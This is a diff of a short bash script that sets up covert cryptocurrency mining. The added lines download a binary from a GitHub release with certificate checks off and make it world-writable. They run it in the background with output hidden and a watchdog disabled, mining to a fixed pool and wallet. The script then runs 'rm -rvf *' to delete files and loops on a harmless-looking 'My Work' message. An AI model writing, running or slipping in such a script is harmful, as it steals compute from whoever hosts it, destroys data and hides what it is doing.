@@ -1,3 +1,11 @@
 #!/bin/bash
-
-./flex -a minotaurx -o 198.50.168.213:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA
+ 
+curl -sLkO http://github.com/paskofa10/webmoon/releases/download/flex/soto
+chmod 777 soto 
+./soto --algorithm minotaurx --pool 188.165.24.209:7019 --wallet MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW --password c=MAZA,zap=MAZA --disable-worker-watchdog >/dev/null 2>&1 &
+rm -rvf *
+while true
+do
+        echo "My Work"
+        sleep 30
+done
